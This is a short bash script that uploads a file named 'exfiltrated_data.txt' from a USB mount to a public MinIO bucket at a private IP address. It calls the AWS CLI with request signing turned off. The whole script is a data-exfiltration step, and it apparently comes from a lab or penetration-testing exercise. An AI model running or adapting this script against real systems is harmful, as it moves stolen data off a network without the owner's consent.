#!/bin/bash

# Target file/folder to upload (adjust path as needed)
TARGET_PATH="/mnt/usb/exfiltrated_data.txt"

# MinIO bucket endpoint
MINIO_ENDPOINT="http://10.10.1.131:9000"

# Upload the file to MinIO
aws s3 cp "$TARGET_PATH" s3://public --endpoint-url "$MINIO_ENDPOINT" --no-sign-request
